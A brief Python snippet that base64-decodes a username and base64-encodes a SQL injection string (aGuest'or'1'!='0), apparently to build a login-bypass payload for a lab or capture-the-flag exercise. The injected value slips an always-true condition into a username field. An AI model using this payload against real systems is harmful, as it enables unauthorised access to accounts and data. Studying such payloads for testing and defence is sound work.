import base64

user = base64.b64decode("YUd1ZXN0")
print(user)

sql = "aGuest'or'1'!='0"
encodedSql = base64.b64encode(sql.encode("utf-8")).decode("utf-8")

print(encodedSql)
